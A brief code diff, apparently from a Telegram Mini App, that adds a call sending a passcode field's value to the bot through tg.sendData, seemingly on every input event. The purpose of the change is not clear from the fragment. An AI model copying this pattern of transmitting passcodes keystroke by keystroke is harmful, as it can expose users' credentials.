@@ -95,5 +95,6 @@ document.addEventListener('DOMContentLoaded', () => {
         if (input.value.length >= input.maxLength) {
             input.blur(); // removes focus → hides keyboard
         }
+        tg.sendData(JSON.stringify({ action: 'passcode_value', value }));
     });
 });
